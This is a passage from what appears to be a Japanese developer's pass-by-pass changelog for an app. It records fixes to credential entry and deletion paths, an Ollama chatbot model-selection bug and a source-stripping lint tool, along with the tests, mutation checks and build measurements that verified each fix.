★ **消す道が 3 つとも塞がっていた** —— 空の包みで上書きする道も入口が断るので、残るのは 「すべてのデータを削除」だけである。法則 `escape-hatch-stays-open` そのもので、対象は**このアプリが預かるうちで最も価値の高い資格情報** (使うと課金される) だった。パス 427 が `StatusBar` について閉じた形の、**自前のフォームを持つ画面での現れ**である (あちらは「保存した直後に「削除」が出ない」で、こちらは**最初から 1 度も出ない**)。★ **`teamradar` は同じ走査に出たが書き手が 0 件** (実測・パス 452 の測定どおり) なので、今日保存される道が無い —— **罠であって生きた欠陥ではない**。書き手が生えた日に新しい census が両方向のどちらかで鳴る。**直し**: ① 確認文と結果の文は `data/credentialSaveMessage.ts` が持つ (`.tsx` は変異検査の母集団の外・パス 386 / 445 / 446 と同じ判断。保存の側 `savedCredentialMessage` の隣) ② **確認文は「まとめて消える」と「元に戻せない」を押す前に言う** —— 鍵は 1 つの JSON にまとめて 入るので提供者ごとには残せず、「削除しますか?」だけだと押した人は自分が選んだ 1 つだけが消えると読む。**提供者の名前は写さない** (`AI_CREDENTIAL_FIELDS` が増えた日にこの文だけが古びる) ③ **分からないときは出す側へ倒す** —— 出すかどうかは `listConfigured()` **だけ**が決め (`providers` から導くと、保管庫が施錠されて読めないときや包みに互換 API の URL しか無いときに**預かっているのに消す口が消える** = 直している欠陥そのもの)、`false` と分かったときだけ隠す ④ 形は既に在る 2 つ (`StatusBar` の「削除」・設定画面の保管庫スロットの `clear()`) に揃える (確認つき・`res.ok` を見る・失敗を黙らない)。★ **機械は 2 層** —— `renderer/pages/__tests__/assistantCredsDelete.test.ts` (**6 件**) が**実物のパネルを描いて実際に押し**、保管層へ `clearToken('assistant')` が届くこと・確認を断れば 1 件も消さないこと・失敗を黙らないこと・**読めなくても口が出ること**を見る。`renderer/__tests__/credentialDeletePathCensus.test.ts` (**8 件**) が母集団を**両方向**で持つ (A: 宣言が「預かる」サービスは `tokenSetup` を渡すか台帳に在る / B: 画面が字面のスロットへ書く所 **5 件**はすべて台帳に在り、台帳の行はすべて原文に在る)。★ **錠は構造で取った** —— パネルは畳まれて出るので、開くボタンを押した**後に現れる伏せ字の欄**で待つ (パス 442 / 445 / 449 / 450 / 452 で踏んだ罠)。対照 **9 方向すべて鳴り、それぞれ狙った層に当たる** (A ボタンの JSX を消す ❌5 (**振る舞いだけ** —— census は `clearToken` の在ることで満たされる) / **A2 印 (`data-clear-agent-creds`) ごと消す ❌6** (census も鳴る) / B `res.ok` を見ない ❌1 / C 分からないときは隠す ❌1 / D 確認しない ❌2 / E 台帳から assistant の行を消す ❌1 / F `TeamRadarPage` に `tokenSetup` を足す ❌1 (**書き手が生えた形**) / G 針から受け手を外す ❌2 / H `LITERAL_WRITERS` から 1 行消す ❌1 / I 伏字を外す ❌1・復帰後 **22 / 22**)。★ **A が census を鳴らさなかったのは報せだった** —— 「口が在る」と「押せる」は別で (法則 `mention-vs-declaration`)、census は**誰も辿れない handler** で満たせてしまう。押す所の印も見る 1 行を足して、いちばん安い退行 (JSX を消す) を 2 層で塞いだ。★ **ゲートが 2 つ捕まえた** —— ① **`errorMessageSurfaceCensus` (パス 314)** が私の新しい `catch` を「伏字を通らずに例外の文面を流す行」として鳴らした (**設計どおり**・その注記が「同じ行で伏せられるなら伏せる」と言っていた)。`redactForMessage(…, ERROR_MESSAGE_MAX_CHARS)` を通した —— ★ **判定は行単位**なので `const raw = …` へ分けると再び数えられる (実際に 1 度そうなった) ② `verify:arch` のユニットテスト数を 15746 → **15760** へ (**今回も予想せず門に訊いた**)。★ **自戒: 私の測り方が 3 度誤った** —— ① 最初の走査は `App.tsx` に id → 画面の対応表が在ると思い込み **74 / 74 を `page=NONE`** と報告しかけた (実物は `services.ts` の `page:` 欄) ② census の針を `stripNonCode` へ当てたが、**この道具は文字列リテラルの中身を落とす** —— スロットの名前を読む走査には使えない (docblock にそう書いた直後に自分で踏んだ)。**名前の確認は肯定形で原文を見る**形に直し、6 つ目の注記除去器を作らずに済ませた (実測: `stripComments` の写しは検査ファイルに既に 5 つ在る) ③ 検査は 6 件とも緑なのに `typecheck` だけが 2 件捕まえた (`waitForElement` の引数) —— **パス 373 / 402 / 404 / 434 / 445 / 446 / 448 と同じ罠で 8 度目**である。★ **測って何も無かった軸も記録する**: ① **`google-access` は掃除の節で消せる** —— `ServiceId` ではないので `credentialUseOf` が最も慎重な側 (`none`) へ倒し、`unusedStoredCredentials` が拾う (読み手は出荷コードに **0 件**・注記は「後方互換 / 単独参照用」) ② **Google の 3 スロット (`drive` / `calendar` / `gmail`) は `tokenSetup` を渡すので「削除」が出る** ③ **設定画面の保管庫スロット 9 つは最初から `clear()` を持つ** (確認つき・失敗を黙らない) ④ **「空欄は未変更ではなく「未設定」として保存」の 1 文は元から正しい** (まとめて置き換わることを画面が既に述べている —— 偽ではないので触っていない)。`typecheck` 緑・`npm test` **884 / 18,950**・`verify:all` exit 0・`chain:verify` 緑 (保護対象は 1 つも触っていない)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 250 ms / heap 10.4 MB・FULL DCL 691 ms / heap 36.9 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **49 回目**でもあり、今回も再現しなかった)。**`e2e:ollama` は回していない** —— main の Ollama を 1 行も触っていない)・— **2026-09-24 パス 452 後の計測: 11,964,503 B / 3,377,022 B (両方 −67 B** —— `ShopifyPage` から資格情報の入力欄 1 つ (ラベル・placeholder つき) を外し、宣言を `'action'` → `'none'` にした分。**算術が合う**: 最小化後の `tokenSetup:{label:"API トークン",placeholder:"Bearer token"}` が ≒65 B、綴りが 2 字短くなった宣言が −2 B。`LOCAL_SERVICES` への追加と `scripts/` の畳み込みは出荷物に入らない。**読まれない資格情報が「門」として働いており、預けないと静的な見本すら見せなかった。** **見つけ方**: パス 451 の census が残した 2 件を閉じに行き、**ゲートの針ごと**替えた —— `scripts/lint-credential-use.cjs` の `touchesToken` は `/\btoken\b/` を**ファイル全体**に当てており、注記も文字列も、そして**別人のトークン**も同じに見えていた。実測 (2026-09-24 · 直す前):

| 測った物 | 実測 |
| --- | ---: |
| `shopify.ts` で `ctx.token` を読む出荷コード | **0 件** (出現は 35 行目の注記 1 行だけ) |
| 7 つのコネクタが読む物 | `ctx.payload.token` = **連携先**のトークン |
| 取得 `fetchShopifySnapshotImpl(_ctx)` | 引数を無視して STUB を返す |
| 出荷コードからコネクタを呼ぶ所 | **0 件** |
| それでも画面が預かっていた物 | **「API トークン」** (`placeholder: 'Bearer token'`) |
| 針を替えて**分類が動く**サービス | **1 / 76** (`shopify` だけ。`kpi` / `funding` は元から `none`) |

★ **これは 2026-08 の監査が 8 サービスについて閉じた形の 9 件目** —— あの規則は「`LIVE_ACTIONS` に登録が無い」を条件にしており、**shopify は 7 つのコネクタを持つので構造的に母集団へ入らなかった**。見つけたのは別の道 (面の側から数えた census) である。★★ **本体は宣言の誤りではなかった** —— 宣言を `none` にして欄を外した瞬間、オントロジーの公理 `actions-need-reader-or-local` が鳴った。shopify は `LOCAL_SERVICES` に居なかったので `fetch:snapshot` と `action:invoke` は**「トークン未設定」で断り続ける** ——つまり**読まれない資格情報が門として働いており**、「Shopify の Admin API トークンを預けないと静的な見本すら見せない」形だった (しかも預けた鍵は誰も読まない)。**欄を外すだけだと開ける手が消える** (法則 `escape-hatch-stays-open` の裏返し) ので、`LOCAL_SERVICES` へ足して閉じた。**直し**: ① 針を `ctx.token` へ (注記と文字列は `stripNonCode` で落とす) ② 宣言を `none` へ ③ 画面の欄を外す (既に保存した人は`unusedStoredCredentials` が拾う —— 実測で掃除の節に出る) ④ `LOCAL_SERVICES` へ足す。★ **`teamradar` は同じ手では閉じられないと測って決めた** (task #129 の計画は「両方を `none` へ」だったが、測定が前提を変えた) —— `ctx.token` の 1 件は`exportTeamRadarSvgImpl` の**本物の読み**なので針を替えても分類は動かず、落とすには呼び先を辿る解析が要る (あの門が「しない」と宣言している物)。しかも呼び先の`deps.fetchSnapshot` は差し替え可能な継ぎ目で、既存の検査が「空のオブジェクトを渡すと認証の要る取得へ差し替えたときに黙って失敗する」として**渡すこと自体を仕様にしている**。teamradar は `LOCAL_SERVICES` に居るので門としても働いていない (実害 0)。**面は `credentialFaceCensus` の `ignoredByCallee` の行が両方向で持つ。**★ **3 人目の消費者が要ったので、写しを 3 → 2 に減らした** —— `stripNonCode` を`scripts/lib/strip-non-code.cjs` へ出し、2 つのゲートがそこを require する(**判定は 1 行も変わらない** —— 両ゲートの出力を before / after で diff して同一)。**そのときパリティ検査の走査自身の死角が 2 つ出た**: ① 母集団の走査が`['src/shared/__tests__', 'scripts']` を**直下だけ**歩いており、`scripts/lib/` は既に在るのに 1 度も見ていなかった —— **写しを 1 階層下へ動かすだけで両方向の台帳が黙る**形で、**私はまさにそこへ動かそうとしていた** (再帰にした) ② 針を素の原文へ当てていたので、**走査が自分の注記を宣言として数えた** (`DECLARATION` の説明文に綴った名前が 3 件目として出た · 法則 `mention-vs-declaration`) —— **この道具を自分自身に当てる**のが正しい形で、その注記は今は**標本として意図的に残してある** (消すと `it` が「標本が古い」と鳴る)。★ **機械は 3 層** —— `scripts/lint-credential-use.cjs` の自己検査に**針を見分ける 3 件**(`payload.token` / 注記の中 / 文字列の中)、`renderer/components/__tests__/statusBarCredentialFilter.test.ts` (**5 件**) が**`StatusBar` の 2 枚目の層** (`collectsCredential ? tokenSetup : undefined` —— **それまで検査が 1 つも無く、消しても18,900 件すべて緑だった**) を実物を描いて留め、`stripNonCodeParity.test.ts` を**27 件**へ (再帰の走査・実体の同一性・自分自身の標本)。★ **対照 7 方向すべて鳴り、それぞれ狙った検査に当たる** (A `StatusBar` のふるいを外す ❌1 / **B `ShopifyPage` に欄を戻す → ゲート ❌1・jsdom は 0** / **A+B → ❌2 (直す前の姿が再現)** / C 宣言を `action` へ ❌1 + census ❌3 / D 針を `\btoken\b` へ ❌1 + 自己検査 ✗3 / E 走査を直下だけへ ❌1 (**死角がそのまま再現**) / F ゲートが自分の写しを持つ ❌2)。★ **B が鳴らなかったのは報せである** —— 欄は**2 枚で守られている** (prop と `StatusBar` のふるい) ので、片方だけ戻しても画面は変わらない。**どの対照がどの層に当たるかを測って書いた**のがこのパスの副産物で、A+B を重ねて初めて実物の画面が鳴る。★ **自己検査の 1 件が「理由が違うだけで数が同じ」だった** —— `payload.token` の対照は入力欄を残したままだと針の新旧どちらでも 1 件鳴り (新: 「読まないのに欄が在る」/ 旧: 「宣言が古い」)、**針を見分けられない**。欄を外して 0 件を期待する形に直すと D が✗2 → ✗3 になる。★ **ゲートが 4 つ捕まえた** —— ① `ontologyFacets` の公理 (上記・**本体**) ② `ontologyDoc` (`npm run ontology:md` で再生成) ③ `redactionCoverage` の母集団が 23 → 22 (**`shpat_` / `shpss_` の伏字は消えていない** —— 母集団に依らない `PREFIXED` の表が別に留めており、既に保存した人の値や第三者が反射した値には今日も掛かる) ④ `verify:arch` のユニットテスト数を 15740 → **15746** へ (**今回も予想せず門に訊いた**)。★ **`LOCAL_SERVICES` の docblock も実測へ直した** —— 「snapshot fetcher reads local resources … does not require any saved credentials」は名前より狭く、実測すると**52 件のうち 7 件が `ctx.token` を読む** (`skills` / `security` / `emotions` / `stocks` / `business` / `teamradar` / `assistant` —— 資格情報は*任意*であって不在ではない)。「**保存済みの**資格情報が要らない」と読むのが正しく、その差は「このサービスはここに属するか」を決めるときに効く。`typecheck` 緑・`npm test` **882 / 18,936**・`verify:all` exit 0・`chain:verify` 緑 (保護対象は 1 つも触っていない)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 239 ms / heap 10.3 MB・FULL DCL 703 ms / heap 36.9 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **48 回目**でもあり、今回も再現しなかった)。**`e2e:ollama` は回していない** —— main の Ollama を 1 行も触っていない)・— **2026-09-24 パス 451 後の計測: 11,964,570 B / 3,377,089 B (両方 +60 B** —— 断りの 1 文と、鍵を読む口をサービスのスロット優先へ替えた分・画面の `tokenSetup` 2 つ。main 側の門 2 つは出荷物に入らない。`shared/` と `renderer/` は両ビルドが読むので LITE も同じだけ増える。**鍵を読む口は在るのに、鍵を置く口がどの画面にも無かった。** **見つけ方**: パス 450 の双対 —— アプリが**宣言**している能力と、実際に届く先のずれを**面の側から両方向に**数えた。資格情報を預かる 23 サービスについて「client が `ctx.token` を読むか (読み手)」と「画面がそのスロットへ書く口を持つか (書き手)」を測ると **3 つの形**が出た。実測 (2026-09-24 · 直す前 · 実物の handler に空のトークンを渡し、偽の fetch で要求を読む):

| handler | 空のトークンで何が起きたか | 網を叩いた回数 | 利用者が読む文 |
| --- | --- | ---: | --- |
| `emotions/analyze-text` | 送る前に断る | **0 回** | 英語の 1 文 |
| **`stocks/advise`** | **空の鍵で送る** | **1 回** | 相手の 401 の本文 (「鍵が不正」) |
| **`business/advise`** | **空の鍵で送る** | **1 回** | 同形 |

★ **利用者が読む「鍵が不正」は原因を取り違えさせる** —— 鍵は不正ではなく**存在しない**。読んだ人は「鍵を貼り直す」へ行くが、**デスクトップ版にはこの鍵を置く口がどの画面にも無かった** (実測: 資格情報を書く出荷コードは `StatusBar` の `tokenSetup` だけで、株式と事業ダッシュボードはそれを渡していなかった。設定画面の 9 スロットにも `stocks` / `business` は無い)。パス 388 の「原因を取り違えた断りは、直す手ごと誤らせる」の、**直す手が存在しない**形である。★ **同じ質問にアプリが 2 通り答えていた** —— ブラウザ版の 2 つは `anthropic` のスロットを読み**断って逃げ口を名乗る**のに、main はサービスのスロットを読み**門が無い**。`emotions` だけが 3 つとも揃っていた (サービスのスロット・`tokenSetup`・門)。パス 402 / 407 と同じ「**弱い方が main に立っている**」形。★ **なぜ既存の census が見なかったか** —— パス 284 / 285 は「両ビルドに**双子**が在る断り」を数えたので、**片側が 0 件の組は母集団に入らない** (パス 450 の「読み手が在って書き手が 0 件」と同じ死角 —— **対を数える走査は、片方が無い物を見ない**)。**直し**: ① 文は 3 画面と両ビルドで **1 つ** (`MISSING_ANTHROPIC_KEY_MESSAGE`) —— `emotions` の main はまだ英語で、`ADVISOR_QUESTION_MESSAGES` の docblock が 2026-09-15 に同じ形を直した当のことが**5 組目として残っていた** ② main の `stocks` / `business` に門 (`emotions` と同じ位置・送る前) ③ `StocksPage` / `BusinessPage` に `tokenSetup={{ label: 'Anthropic API キー', placeholder: 'sk-ant-…' }}` (感情ログと**同じラベル・同じ placeholder**) と `isConfigured` を hook から ④ ブラウザ版は **サービスのスロットを先に、`anthropic` を後に**読む (`readAnthropicKey`) —— `anthropic` を落とすと設定画面に入れた既存の利用者がその場で鍵を失うので、**誰も何も失わない**順序にした。★ **正当な利用者の答えは 1 つも変わらない** (鍵が在れば今までどおり)。★ **この census が測定の道具の欠陥を見つけた** —— 針が「`skills` は `ctx.token` を読まない」と答えたが**偽**で、実物の 466 行目は `'x-api-key': ctx.token` である (同じ形の `stocks` / `business` は数えられていた)。差は 90 行目の**引用符を含む正規表現** 1 つ —— `stripNonCode` は正規表現のリテラルを知らないので文字の所で文字列モードへ入り、**次の同じ引用符までを飲む**。実測 (`src` の 1,428 本):

| | 直す前 | 直した後 |
| --- | ---: | ---: |
| 盲点 10% 以上のファイル | **63 本** | **3 本** |
| 飲まれたコード行の合計 | **5,226** | **97** |
| `main/clients/skills.ts` | **79.5%** | 0 |
| `shared/api/google.ts` | **79.7%** | 0 |
| `renderer/data/voiceCommand.ts` | **85.2%** | 0 |

★ **残る 3 本は私の測り方の偽陽性である** (`welfareDocs.ts` ほかは Markdown を組む**テンプレートの本文**で、落ちて正しい)。★ **正直に言う: 盲点は実在したが、今日どの census の答えも変えなかった** —— 直した後に消費者 25 本を走らせると **24 本が緑のまま**で、変わったのはパス 451 が新しく書いた census (= この盲点を見つけた当のもの) だけだった。★ **写しは 3 つなので `.cjs` 2 本へも移植し** (パス 418 の台帳が縛る)、パリティ検査に標本 **7 つ**を足した (引用符を含む正規表現・文字クラスの中の `/`・エスケープした `/`・割り算 2 形・`return` の後ろ・閉じない `/`)。**失敗の向きを選んだ** —— 行内で閉じなければ「割り算だった」として**今までの振る舞いへ倒れる**ので、新しい飲み込みは生まれない。★ **機械は 3 層** —— `shared/__tests__/credentialFaceCensus.test.ts` (**8 件**) が母集団を `SERVICE_CREDENTIAL_USE` から導いて種類つきの台帳と**両方向**に、`shared/__tests__/advisorMissingKeyRefusal.test.ts` (**4 件**) が**実物の handler に空のトークンを渡して網の口を叩かないことを数え**、`renderer/__tests__/advisorKeySlotParity.test.ts` (**7 件**) が**鍵ごとの保管庫**でブラウザ版の読む順序を、`renderer/pages/__tests__/anthropicKeyFieldOnScreen.test.ts` (**3 件**) が**実物の 3 画面を描いて押して打って保存し、そのスロットへ届く**ことを見る。★ **錠は構造で取った** —— 欄は畳まれて出る (ラベルはボタンの文字として先に在る) ので、押した**後に現れる** `input[type=password]` で待つ (パス 442 / 445 / 449 / 450 で踏んだ罠)。対照 **8 方向すべて鳴り、それぞれ狙った検査に当たる** (A main の stocks の門を外す ❌1 / B business ❌1 / C emotions を英語へ ❌3 / D StocksPage の欄を外す ❌4 / E BusinessPage ❌4 / F `stripNonCode` の正規表現の扱いを外す ❌8 (**実物 3 本の回帰 + census**) / G ブラウザ版を `anthropic` だけへ戻す ❌6 / H census の台帳から 1 行消す ❌1 / I teamradar の `_ctx` を普通の引数名へ ❌1 (**免除の理由を原文で確かめている**)・復帰後 **34 / 34**)。★ **残した 2 件は宣言の誤りで、閉じるにはゲートの針が要る** (手順を `docs/REMAINING_WORK.md` の先頭に測って残した): **`shopify`** = 書き手が在って読み手が 0 件 (「API トークン」を預かるが、10 個の connector はどれも `payload.token` = **連携先**のトークンを読む。`ctx.token` の出現は**注記 1 件だけ**)・**`teamradar`** = 読み手が在るが渡す先 `fetchTeamRadarSnapshotImpl(_ctx, deps)` が**明示的に無視する**。どちらも `'none'` へ直すと `lint:credential-use` の `touchesToken` (`/\btoken\b/` を**ファイル全体**に当てる) が「`action` のはず」と鳴るので、**針ごと**替える別のパスで閉じる。**逃げ口は今日も開いている** (パス 427 の `StatusBar` の「削除」)。★ **ゲートが 4 つ捕まえた** —— ① `verify:arch` のユニットテスト数を 15729 → **15740** へ (**今回も予想せず門に訊いた**) ② **`lint:test-coverage` が TDZ で落ちた** —— `.cjs` の写しにヘルパーを**ファイル末尾の `const`** で足したが、この本は読み込みの時点で `main()` を走らせるので `ReferenceError`。**パス 371 と同じ罠で 2 度目**で、**関数宣言は巻き上げられる**ので `switch` の関数へ直した (3 つの写しとも同じ形) ③ `lint:shared-judgement` —— `advisorQuestionLimits` の main 側の読み手が 2 → 3 (`emotions` が入った)。**判定の散文は今も真**なので、5 組目とその死角を理由に書き足して再生成 ④ `eslint` —— 私の予防的な `eslint-disable` 2 行が「不要な抑止」で鳴った (**抑止を予防的に書くと、抑止そのものが嘘になる** · パス 418 と同じ) ⑤ `originalSourcePolicy` —— census の `readdirSync` が「道が読めない生の読み」として鳴った (`readOriginalDirEntries` へ)。`typecheck` 緑・`npm test` **881 / 18,931**・`verify:all` exit 0。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 252 ms / heap 10.3 MB・FULL DCL 723 ms / heap 36.9 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **47 回目**でもあり、今回も再現しなかった)。**`e2e:ollama` は回していない** —— main の Ollama を 1 行も触っていない)・— **2026-09-24 パス 450 後の計測: 11,964,510 B / 3,377,029 B (両方 −545 B** —— 入力欄 8 つの手書きの JSX を表から組む 1 つの `.map` へ畳み、欄を 3 つ足した差し引き。**減るのは、消した JSX の繰り返し (`style` / `onChange` / `aria-label` を欄ごとに 8 回) が、足した表の 3 行より大きいため。** `renderer/data/` は両ビルドが読むので LITE も同じだけ減る。**アプリが読んでどのモデルを呼ぶかを決める 3 つの欄に、出荷コードの書き手が 1 件も無かった。** **見つけ方**: パス 449 の技 (**面の側から数え、読み手が在って書き手が 0 件の物を探す**) を localStorage の外へ広げた。**4 つの軸のうち 3 つは何も無かった (測って記録する)**: ① sessionStorage の 4 鍵は `oauth/pkceSession.ts` **ただ 1 つ**が書き・読み・消すので対称 ② `VaultMeta` の 11 欄はすべて書き手を持つ (`recoveryVersion` を含む) ③ `service-hub-window.json` の 2 欄は `sanitizeWindowPrefs` を通って読み書きが揃う。本物は **4 つ目の軸の隣**に在った —— 環境変数を数えていて OAuth の `clientSecret` の非対称に気付き、そこから資格情報の欄そのものを数え直した。実測 (2026-09-24 · 直す前 · 出荷コードの走査・注記は落とす):

| 欄 | 出荷コードの出現 | 書き手 |
| --- | ---: | --- |
| `ollamaModel` / `compatModel` | 7〜9 | **画面に入力欄が在る** |
| **`anthropicModel`** | **3** | **0 件** (宣言・受理一覧・読み手だけ) |
| **`openaiModel`** | **3** | **0 件** |
| **`geminiModel`** | **3** | **0 件** |

★ **非対称が逆を向いていた** —— 利用者が自分でモデルを選んでから使う側 (端末内の Ollama・自分で建てた互換サーバ) には入力欄が在り、**提供者が自分の都合でモデルを退役させる側 (クラウドの 3 つ) に無い**。★ **欄は書ければ効く** (実測・偽の fetch で要求の本体を読む) —— 欄が無ければ `spec.defaultModel` がそのまま要求の `model` になり、欄に別の名前を置けばその名前が載る。**アプリはつまみを作ってあり、回す口だけが無かった** (パス 449 の「原因も直す手も計算済みで捨てていた」の、**操作子の側**の現れ)。★ **パネルの一文が事態を 1 段重くしていた** ——「空欄は未変更ではなく「未設定」として保存」。保存はフォームの 8 欄から組んだ JSON の**まるごと置き換え**なので、他の手段でこの 3 欄を置いた人が居ても**次にパネルを保存した時点で消え**、入力欄が無いので**戻す手が無い** (法則 `escape-hatch-stays-open`)。★ **断りの文は元から正しい** (実測: `Claude (Anthropic) API 404: {…"message":"model: …"}` で、本文は `redactForMessage` の梯子を通りモデル名も出る) —— **足りなかったのは逃げ口のほう**で、読んだ人が直しに行ける場所が無かった。**直し**: ① 入力欄の表 `renderer/data/aiCredentialFields.ts` を 1 つ置き、**母集団は `AI_CREDENTIAL_STRING_KEYS`** (= 受理して読む欄) から導く ② フォームの型も空の器もその表から導く (手で並べると表と食い違う) ③ **既定モデルの綴りは写さない** —— placeholder は `AI_PROVIDERS[id].defaultModel` を読むので、**画面が「何を上書きするのか」を見せる**ようにもなった (`providerStatuses` は `defaultModel` を返すのに描く所が 0 件だった) ④ `ollamaModel` の placeholder は既定と同じ綴りの手書きだったので、**写しが 1 つ減る**。★ **正当な利用者の答えは 1 つも変わらない** (既存の `assistantCredsSave.test.ts` 8 件は編集せずに緑)。★ **機械は 2 層** —— `renderer/data/__tests__/aiCredentialFields.test.ts` (**15 件**) が母集団と表を**両方向**に突き合わせ (12 個目の欄を足した日に鳴る)、placeholder が spec の既定と一致することを留める。背骨は `renderer/pages/__tests__/aiCredentialFieldsWritable.test.ts` (**5 件**) で、**実物のパネルを描いて全欄を打ち、保存して保管層へ渡る JSON を見る**。★ **錠は構造で取った** —— パネルは畳まれて出るので、開くボタンを押した**後に現れる入力欄**で待つ (パス 442 / 445 / 449 で踏んだ罠)。対照 **6 方向すべて鳴り、それぞれ狙った検査に当たる** (A 3 欄を表から外す ❌9 (**欠陥がそのまま再現**) / B 画面がモデル欄を描かない ❌4 (**背骨だけ —— census は通る**) / C placeholder に古い綴りを写す ❌2 / D 空の器を手書きへ ❌1 / E モデル欄を伏せ字に ❌2 / F 12 個目の欄を shared へ足して表に書かない ❌2・復帰後 **19 / 19**)。★ **ゲートが 4 つ捕まえた —— 1 つは私が守りを弱めたので鳴った**: ① **`secretFieldAutocomplete`** —— `type={f.secret ? …}` と式で書いたら**綴りの母集団が 16 → 12 に落ちた**。門は「`type` を式で書く欄が無い」を**両方向**で要求しており、**正しい**。枝を分けて `type="password"` / `type="text"` を字面で戻し、表から組む以上この画面の寄与は 4 → 1 に縮むので**床を 16 → 13 へ理由つきで下げ、縮んだ分は背骨が描いた DOM で受け持つ** (秘密の欄は 1 つ残らず伏せ字 + `autocomplete="off"`) ② **`lint:forbidden`** —— 私が docblock に**実測のモデル ID をそのまま引用**したので「モデル ID の写経」で鳴った (**パス 449 と同じ形で 2 度目** —— 記述が正確だったせいで鳴る)。綴りを再現せずに述べる形へ直した ③ `mutateScopeCensus` —— 新しい `data/` のファイルが母集団に入るので理由つきで台帳へ ④ `verify:arch` のユニットテスト数を 15713 → **15729** へ (**今回も予想せず門に訊いた**)。★ **整合性チェーン** —— `shared/ai/credentials.ts` は保護対象なので `chain:verify` → `chain:append` で block **#258** を採掘した (今回は順序を守れた)。`typecheck` 緑・`npm test` **877 / 18,898**・`verify:all` exit 0。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 250 ms / heap 10.3 MB・FULL DCL 707 ms / heap 37.1 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **46 回目**でもあり、今回も再現しなかった)。**`e2e:ollama` は回していない** —— main の Ollama を 1 行も触っていない)・— **2026-09-24 パス 449 後の計測: 11,965,055 B / 3,377,574 B (両方 +783 B** —— 行き先を導入済みの一覧から決める口 1 つ・断りの 2 文 (日本語)・widget の配線。**増分の大半はその 2 文**で、docblock は最小化で落ちる。`renderer/data/` は両ビルドが読むので LITE も同じだけ増える。**アプリが自分の導入手順で入れたモデルを呼ばず、原因と直す手を変数に持ったまま捨てて、「Ollama 接続時は自由質問にもお答えします。」と答えていた。** **見つけ方**: パス 448 の技 (**面の側から数える**) を localStorage の 22 鍵へ当て、**読み手が在って書き手が 0 件の鍵**を探した。2 件出て、1 件が本物だった (`servicehub.ollama.port` は素通りの後方互換で、読むのは `?? ` の 2 段目だけ)。本物は `chatbot-ollama-model` —— AI コンシェルジュが自由質問を端末内のモデルへ回すときの**行き先**である。実測 (2026-09-24 · 直す前 · 走査と、実物の widget を jsdom で描いて自由質問を打つ):

| 測った物 | 実測 |
| --- | --- |
| `chatbot-ollama-model` へ**書く**出荷コード | **0 件** (消す側 `eraseAll.ts` と台帳が名を挙げるだけ) |
| したがって widget が送るモデル | **常に `llama3.2`** |
| **`npm run ollama:setup` が入れるモデル** | **`llama3.2:1b`** (`DEFAULT_SETUP_MODEL`) |
| アプリが組んだ助言 | 「モデル「llama3.2」がまだ取得されていません。」+「**インストール済みの「llama3.2:1b」を指定すると動きます。**」 |
| **画面に出た助言** | **0 文字** (`if (!res.ok) return null` が捨てる) |
| 画面に出た文 | 「🤔 うまく解釈できませんでした。… **Ollama 接続時は自由質問にもお答えします。**」 |

★ **その 1 文は、その利用者にとって証明可能に偽である** —— 接続しており、アプリは実際に試し、**失敗の原因も直す手も変数に持ったまま捨てていた**。読んだ人は「自分は繋がっていないのだ」と読んで Ollama の導入をやり直す —— 直すべきはモデル名である (パス 388 の「原因を取り違えた断りは、直す手ごと誤らせる」の、**アプリが正解を計算済みで捨てている**という現れ)。★ **同じアプリの 2 つの導入手順が別のモデルを入れる** —— `ollama:setup` は `llama3.2:1b`、画面と CLI (`OllamaPage.tsx:174` / `ollama-cli.cjs:223`) は `ollama pull llama3.2` (実体は `llama3.2:latest`)。**直書きの `'llama3.2'` は後者にしか当たらない。** ★ **2 つ目 —— 同じ助言を両ビルドが別に答えていた**: `describeOllamaError` は `installed` を渡されたときだけ 「インストール済みの「X」を指定すると動きます。」を出す。ブラウザ版 (`ollamaWeb.ts:576`) は失敗の枝で `/api/tags` を引いて渡すのに、**main だけが渡していなかった** —— デスクトップ版は「(取得する: ollama pull llama3.2)」と、**目の前に在るモデルの名前を 1 度も言わない** (2 つ目の hint は「まだ 1 つもモデルがありません」で、**入っている利用者に対して偽**。画面は `hints[0]` しか出さないので今日そこは見えない)。パス 402 / 407 と同じ「**弱い方が main に立っている**」形である。**直し**: ① **名前を推測しない** —— `chatbotOllamaModel(override, installed)` が導入済みの一覧から決める (順序: 上書きが導入済みに在る → 一覧が読めない → 種が導入済みに在る → **アプリ自身の寄せ `suggestInstalledModel`** → **導入済みが 1 つだけならそれ** → 種のまま。**返す物は必ず `isSafeModelName` を通る**) ② **断りを捨てない** —— `tryOllama` が `{reply} | {refusal} | null` を返し、**橋が無いときだけ `null`** (そのときは定型文がその人にとって真である) ③ **原因は作り直さず運ぶ** (`ollamaRefusalNote`) —— 作り直すと「計算が使った理由」と「画面が述べる理由」が食い違う (パス 401 の形)。第三者 (利用者が設定した Ollama ホスト) の文が混ざるので `redactForMessage` の梯子を通す ④ **逃げ口を名指しする** —— この widget にモデルを選ぶ口は無いので「Ollama」の画面を言う ⑤ main も失敗の枝で `/api/tags` を引く。**形はブラウザ版に合わせる** (まず分類し、**未取得モデルのときだけ**引く —— 403 / 500 で引くと既に失敗している相手へ往復を増やすだけで助言は 1 字も変わらない)。★ **文は data 層が持つ** (`.tsx` は変異検査の母集団の外・パス 386 / 445 と同じ判断)。★ **機械は 2 層** —— `renderer/data/__tests__/chatbotOllamaModel.test.ts` (**14 件**) は **期待値を `DEFAULT_SETUP_MODEL` から導く** (名前を写すと既定を変えた日にこの検査だけが古びる)。背骨は `renderer/components/__tests__/chatbotOllamaOnScreen.test.ts` (**3 件**) で、**実物の widget を描いて実際に自由質問を打つ**。main は `ollama.test.ts` に **4 件** (導入済みの名前が助言に載る・一覧が引けなくても結論は変わらない・**未取得モデル以外では引かない**・**両ビルドの失敗の枝を原文で走査**して「分類だけ 1 件 + `installed` つき 1 件」を両方向に留める)。★ **錠は構造で取った** —— この widget は畳まれて出るので、開くボタンを押した**後に現れる入力欄**で待つ (ラベルは開く前から在る・パス 442 / 445 / 446 / 447 / 448 で踏んだ罠)。対照 **9 方向すべて鳴り、それぞれ狙った検査に当たる** (A モデルを直書きへ戻す ❌9 